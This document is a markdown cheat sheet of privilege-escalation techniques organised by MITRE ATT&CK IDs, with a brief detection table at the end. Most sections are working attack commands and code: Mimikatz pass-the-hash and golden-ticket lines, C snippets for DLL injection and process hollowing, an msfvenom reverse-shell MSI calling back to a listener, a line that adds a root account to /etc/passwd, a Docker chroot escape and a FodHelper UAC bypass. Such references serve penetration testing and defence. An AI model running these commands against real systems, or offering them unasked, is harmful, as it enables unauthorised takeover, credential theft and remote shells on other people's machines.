# MITRE ATT&ACK: Privilege Escalation (TA0004)

> Techniques to obtain higher-level permissions on a system or network.

---

## T1078: Valid Accounts (Privilege Escalation Context)

- **Local Administrator Password Reuse**: Same password across multiple machines
- **Pass-the-Hash**: Use NTLM hash without knowing plaintext password
- **Pass-the-Ticket**: Use Kerberos TGT/TGS without password
- **Overpass-the-Hash**: Request Kerberos TGT using NTLM hash
- **Golden Ticket**: Forge TGT with KRBTGT hash
- **Silver Ticket**: Forge TGS for specific service

```bash
# Mimikatz pass-the-hash
sekurlsa::pth /user:administrator /domain:corp.com /ntlm:7c4a8d09ca3762af61e59520943dc264

# Golden ticket
kerberos::golden /user:administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
```

---

## T1055: Process Injection

### T1055.001: DLL Injection
```c
// Classic DLL injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID alloc = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, alloc, dllPath, sizeof(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), alloc, 0, NULL);
```

### T1055.012: Process Hollowing
```c
// Create suspended process, unmap, map malicious image, resume
CreateProcess("C:\Windows\System32\notepad.exe", ..., CREATE_SUSPENDED, ...);
NtUnmapViewOfSection(hProcess, peb.ImageBase);
VirtualAllocEx(hProcess, imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, imageBase, payload, imageSize, NULL);
NtResumeThread(hThread, NULL);
```

### T1055.013: Process Doppelganging
- Create section from transacted file, roll back transaction, create process from section

### T1055.015: ListPlanting
- Manipulate ListView message to execute arbitrary code in target process

---

## T1134: Access Token Manipulation

### T1134.001: Token Impersonation/Theft
```powershell
# Incognito (Meterpreter)
use incognito
list_tokens -u
impersonate_token CORP\administrator

# Token duplication with PowerShell
# Requires SeDebugPrivilege
```

### T1134.002: Create Process with Token
```powershell
# Create process as another user using stolen token
# Invoke-TokenManipulation from PowerSploit
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
```

### T1134.003: Make and Impersonate Token
- `LogonUser` + `ImpersonateLoggedOnUser`

### T1134.004: Parent PID Spoofing
```c
// Create process with spoofed PPID
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

### T1134.005: SID-History Injection
- Add SIDs from trusted domains to escalate privileges in forest

---

## T1053: Scheduled Task/Job (Privilege Escalation)

- Create scheduled task running as SYSTEM
- Abuse task permissions (if user has write access to existing task)

---

## T1071: Application Layer Protocol

- Protocol tunneling for C2 (DNS, HTTPS, ICMP)

---

## Linux Privilege Escalation Techniques

### Kernel Exploits
- Check kernel version: `uname -a`
- Search for exploits: `searchsploit linux kernel $(uname -r)`
- Common CVEs:
  - CVE-2016-5195 (DirtyCow)
  - CVE-2021-3156 (Sudo Baron Samedi)
  - CVE-2022-0847 (DirtyPipe)
  - CVE-2023-4911 (Looney Tunables - glibc ld.so)

### SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# GTFOBins - search for exploitable SUID binaries
# https://gtfobins.github.io/
```

### Capabilities
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid+ep - can set any UID
# cap_dac_read_search+ep - bypass file read permission checks
```

### Sudo Misconfiguration
```bash
# Check sudo privileges
sudo -l

# Common misconfigs:
# (ALL : ALL) NOPASSWD: ALL
# (ALL) NOPASSWD: /usr/bin/less
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) NOPASSWD: /usr/bin/awk
```

### PATH Hijacking
```bash
# If root runs a script that calls an unqualified command:
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
```

### Writable /etc/passwd
```bash
# If /etc/passwd is writable:
openssl passwd -1 -salt hacker hacker
echo 'hacker:$1$hacker$zV9QJ7YrIZu6xB0GwG3fD1:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Cron Abuse
```bash
# If cron runs a script you can write to:
ls -la /etc/cron*
# Check PATH in crontab
# Check file permissions on scripts
```

### Docker Group Escalation
```bash
# If user is in docker group:
docker run -v /:/host -it alpine chroot /host sh
# Instant root
```

### NFS Root Squashing
```bash
# Check NFS exports
cat /etc/exports
# If no_root_squash is set, mount as root and write SUID binary
```

---

## Windows Privilege Escalation Techniques

### Unquoted Service Paths
```cmd
# Vulnerable service path:
# C:\Program Files\Vulnerable Apppp.exe
# Attack: Place malicious app.exe at C:\Program.exe

# Find unquoted services
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v '"'
```

### Weak Service Permissions
```powershell
# Check service DACL
# PowerUp.ps1: Invoke-AllChecks
# accesschk.exe: accesschk -uwcqv "Authenticated Users" *
```

### AlwaysInstallElevated
```cmd
# Check registry
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

### DLL Hijacking
```powershell
# Find writable paths in PATH
# Procmon: filter by NAME NOT FOUND for DLLs
# Place malicious DLL in writable PATH directory
```

### Stored Credentials
```powershell
# Credential Manager
cmdkey /list

# Vault credentials
# SharpDPAPI
# Mimikatz: vault::cred

# Unattend files
Get-ChildItem C:\Windows\Panther -Include *.xml -Recurse | Select-String -Pattern "password"

# IIS app pool credentials
C:\inetpub\wwwroot\web.config
```

### UAC Bypass
- **FodHelper**: `HKCU\Software\Classes\ms-settings\Shell\open\command`
- **ComputerDefaults**: `HKCU\Software\Classes\ms-settings\Shell\open\command`
- **SDCLT**: `HKCU\Software\Classes\Folder\shell\open\command`
- **EventVwr**: `HKCU\Software\Classes\mscfile\shell\open\command`

```powershell
# FodHelper UAC bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\open\command" -Name "(Default)" -Value "C:\windows\system32\cmd.exe" -Force
Start-Process "C:\windows\system32\fodhelper.exe"
```

---

## Detection

| Technique | Windows Event IDs | Linux Audit |
|---|---|---|
| Token Manipulation | 4672, 4673, 4674 | ausearch -k user_logins |
| Process Injection | Sysmon 8, 10, 25 | auditd process creation |
| Scheduled Tasks | 4698-4702 | /var/log/syslog |
| Service Abuse | 7045, 4697 | journalctl |
| UAC Bypass | 4688 (process creation) | N/A |
| SUID Abuse | N/A | ausearch -k setuid |
